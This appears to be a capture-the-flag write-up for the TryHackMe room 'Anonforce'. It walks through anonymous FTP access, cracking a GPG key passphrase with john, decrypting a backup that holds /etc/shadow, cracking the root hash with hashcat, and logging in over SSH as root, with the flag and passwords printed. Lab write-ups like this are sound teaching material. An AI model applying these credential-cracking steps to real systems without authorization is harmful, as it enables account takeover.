---
title: Anonforce
description: 'Anonymous FTP access and cracking a private GPG key file'
pubDate: 2024-08-27
category: 'tryhackme'
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/eef338293d4a928420f1603870699e75.jpeg'
---

There is anonymous FTP access, this way we can get the user flag.

```bash
ftp 10.10.217.185
Connected to 10.10.217.185.
220 (vsFTPd 3.0.3)
Name (10.10.217.185:ex-it): anonymous
331 Please specify the password.
Password:
230 Login successful.
...[snip]...
ftp> less /home/melodias/user.txt
606083fd33beb1284fc51f411a706af8
```

## ROOT

In the root there is a directory that stands out (`notread`).

There are 2 files in there, lets grab them:

```bash
ftp> cd notread
250 Directory successfully changed.
ftp> ls -al
229 Entering Extended Passive Mode (|||56167|)
150 Here comes the directory listing.
drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 .
drwxr-xr-x   23 0        0            4096 Aug 11  2019 ..
-rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
-rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
...[snip]...
get backup.pgp
...[snip]...
get private.asc
```

The `private.asc` file seems to be a private GPG key file.
We can brute force it with John:


Create the hash file:
```bash
gpg2john private.asc > private.hash
```

Brute force the hash:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt private.hash
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xbox360          (anonforce)
```

Now lets try to read the `backup.pgp`.

Import the private key, when asked enter the password `xbox360`:
```bash
gpg --import private.asc
gpg: key B92CD1F280AD82C2: public key "anonforce <melodias@anonforce.nsa>" imported
gpg: key B92CD1F280AD82C2: secret key imported
gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
```

Decrypt the file, when asked enter the password `xbox360`:
```bash
gpg --output backup.txt --decrypt backup.pgp
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12
      "anonforce <melodias@anonforce.nsa>"
```

The `backup.txt` file seems to contain the `/etc/shadow` file with the root hash.

Lets brute force the root hash with `hashcat`:
```bash
hashcat '$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0' /usr/share/wordlists/rockyou.txt
...[snip]...
$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:hikari
...[snip]...
```

Now lets SSH into the target machine:
```bash
ssh root@10.10.217.185 # <-- hikari
```
